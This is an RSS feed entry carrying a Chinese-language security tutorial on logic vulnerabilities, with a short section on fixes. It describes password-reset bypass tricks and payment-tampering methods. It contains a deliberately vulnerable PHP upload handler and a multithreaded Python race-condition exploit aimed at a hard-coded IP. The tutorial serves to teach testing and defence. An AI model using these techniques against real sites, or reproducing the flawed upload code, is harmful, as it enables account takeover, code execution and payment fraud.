<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>逻辑漏洞 on </title>
    <link>http://wyb0.com/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</link>
    <description>Recent content in 逻辑漏洞 on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Sun, 31 Jul 2016 18:43:49 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>逻辑漏洞</title>
      <link>http://wyb0.com/posts/logical-loophole/</link>
      <pubDate>Sun, 31 Jul 2016 18:43:49 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/logical-loophole/</guid>
      <description>

&lt;h3 id=&#34;0x00-逻辑漏洞:284c45d8a980c76ad7967d7a865eaeb6&#34;&gt;0x00 逻辑漏洞&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;逻辑漏洞是一种业务逻辑上的设计缺陷，业务流存在问题。
这里说一下密码找回漏洞、多线程条件竞争漏洞和支付漏洞。
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-密码找回漏洞:284c45d8a980c76ad7967d7a865eaeb6&#34;&gt;0x01 密码找回漏洞&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;测试流程&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;* 先尝试正确的密码找回流程，记录不同找回方式的所有数据包
* 分析数据包，找到有效数据部分
* 推测数据构造方法
* 构造数据包验证猜测
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;分类&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;* 邮箱找回
    一般是点击邮件中的链接后会转跳到修密码的页面，这就需要分析链接的token构造了，
    可以考虑是时间戳md5、用户名或邮箱和随机字符串md5等，一般是类似如下链接：
    http://domain/findpwd.php?u=xiaoming&amp;amp;token=MTIzQHFxLmNvbQ==
    http://domain/findpwd.php?id=374&amp;amp;token=2ad64bf14c714dbce88c7993663da7da
    当构造相应链接时就可以重置任意用户的密码
* 手机短信找回
    短信找回一般就是4位或6位验证码，暴力猜测吧
* 找回逻辑错误
    若恶意用户A用15123333333找回密码，此时收到验证码但不使用
    此时恶意用户A再用受害者B的手机号找回密码
    用户A在B的验证表单填入自己收到的验证码，发送
    此时跳转的修改密码页面修改的就是用户B的密码
* 直接修改密码
    在修改密码时跳过选择找回方式，直接访问修改密码的页面进行修改
* 本地验证
    随意输入一个验证码，开Burp抓包，forward，抓返回包，返回包里可能有一个flag字段，
    若flag的值为1则跳转到修改密码页面，所以只要修改返回包即可
* 服务端将验证码返回给浏览器
    在点击获取验证码时，服务器会将验证码发送给浏览器，抓包即可
* 验证码直接出现在url中
    当点击获取验证码时发出的请求链接中直接有code
* 密保问题找回
    回答密保问题，有时一些答案就在html源码里
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-多线程条件竞争漏洞:284c45d8a980c76ad7967d7a865eaeb6&#34;&gt;0x02 多线程条件竞争漏洞&lt;/h3&gt;

&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;多线程条件竞争漏洞是一种服务端的漏洞，服务端是并发处理用户请求的,&lt;br /&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;若并发处理不当或相关操作逻辑设计有缺陷时就会产生一些安全问题。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;文件上传&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;p&gt;服务端可以sudo apt-get install inotify-tools安装监听文件的软件，&lt;br /&gt;
执行inotifywait -m /var/www/html/admin监听admin文件夹中文件的变化&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;//uploads.php代码如下，仅供测试：
&amp;lt;meta charset=&#39;utf-8&#39;&amp;gt;
&amp;lt;?php
    $allowtype = array(&amp;quot;gif&amp;quot;,&amp;quot;png&amp;quot;,&amp;quot;jpg&amp;quot;);
    $size = 10000000;
    $path = &amp;quot;./uploads/&amp;quot;;

    $filename = $_FILES[&#39;myfile&#39;][&#39;name&#39;];

    if (is_uploaded_file($_FILES[&#39;myfile&#39;][&#39;tmp_name&#39;])){
        if (!move_uploaded_file($_FILES[&#39;myfile&#39;][&#39;tmp_name&#39;],$path.$filename)){
            die(&amp;quot;error:can not move!&amp;quot;);
        }
    } else {
        die(&amp;quot;error:not an upload file！&amp;quot;);
    }

    echo &amp;quot;file upload success.file path is: &amp;quot;.$path.$newfile.&amp;quot;\n&amp;lt;br /&amp;gt;&amp;quot;;

    if ($_FILES[&#39;myfile&#39;][&#39;error&#39;]&amp;gt;0){
        unlink($path.$newfile);
        die(&amp;quot;Upload file error: &amp;quot;);
    }

    $ext = array_pop(explode(&amp;quot;.&amp;quot;,$_FILES[&#39;myfile&#39;][&#39;name&#39;]));
    if (!in_array($ext,$allowtype)){
        unlink($path.$newfile);
        die(&amp;quot;error:upload the file type is not allowed，delete the file！&amp;quot;);
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;简单利用代码如下：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
#-*- coding:utf-8 -*-

import requests
import threading
import time

&amp;quot;&amp;quot;&amp;quot;
200个线程上传文件aa.php，同时200个线程同时请求aa.php，aa.php中内容为
&amp;lt;?php fputs(fopen(&amp;quot;info.php&amp;quot;,&amp;quot;w&amp;quot;),&amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot;) ?&amp;gt;，
只要aa.php被请求成功就会生成内容为&amp;lt;?php phpinfo(); ?&amp;gt;的php文件info.php
&amp;quot;&amp;quot;&amp;quot;

is_exit = False

def create_info():
    global is_exit
    while not is_exit:
        url = &amp;quot;http://123.206.78.220/uploads/aa.php&amp;quot;
        resp = requests.get(url)

def put_file():
    global is_exit
    file = {&#39;myfile&#39;:(&#39;aa.php&#39;,open(&#39;C:/Users/Administrator/Desktop/aa.php&#39;),&#39;application/octet-stream&#39;)}
    upload_url = &amp;quot;http://123.206.78.220/uploads.php&amp;quot;
    while  not is_exit:
        requests.post(upload_url,files=file)

def check_info():
    global is_exit
    print &amp;quot;start threading check info.php:&amp;quot;
    url = &amp;quot;http://123.206.78.220/uploads/info.php&amp;quot;
    while True:
        print &amp;quot;check info.php...&amp;quot;
        resp = requests.get(url)
        if resp.status_code == 200:
            is_exit = True
            print &amp;quot;create file info.php success.&amp;quot;
            break

for x in xrange(1,200):
    t = threading.Thread(target=create_info)
    t.setDaemon(True)
    t.start()
    print &amp;quot;start create_into threading %d&amp;quot; % x

for x in xrange(1,200):
    t = threading.Thread(target=put_file)
    t.setDaemon(True)
    t.start()
    print &amp;quot;start put_file threading %d&amp;quot; % x


t = threading.Thread(target=check_info)
t.setDaemon(True)
t.start()
try:
    while t.isAlive():
        pass
    time.sleep(1)
except KeyboardInterrupt:
    print &#39;stopped by keyboard&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;数据库操作&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;在数据库进行update、delete等操作时使用多线程请求，可在一次
update时间内完成多次update，和上面的文件上传其实是一个原理
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-支付漏洞:284c45d8a980c76ad7967d7a865eaeb6&#34;&gt;0x03 支付漏洞&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;攻击者通过修改交易金额、交易数量等从而利用漏洞，
如Burp修改交易金额、使交易数量为负数或无限大等。

* 在支付时直接修改数据包中的支付金额，实现小金额购买大金额商品
* 修改购买数量，使之为负数，可购买负数量商品，从而扣除负积分，即增加积分，
  或使购买数量无限大，无限大时则程序可能处理出错，从而实现0金额支付
* 请求重放，在购买成功后重放请求，可实现&amp;quot;一次购买对此收货&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x04-漏洞修复:284c45d8a980c76ad7967d7a865eaeb6&#34;&gt;0x04 漏洞修复&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;对于密码重置漏洞，可以使用复杂的token，使之不可被预测&lt;/li&gt;
&lt;li&gt;对于密码重置漏洞，校验refer，不使用本地校验等&lt;/li&gt;
&lt;li&gt;对于多线程竞争漏洞，文件移动一定在一切判断之后，对于数据库则可以设置锁&lt;/li&gt;
&lt;li&gt;对于支付漏洞，主要就是签名了，或者https&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
  </channel>
</rss>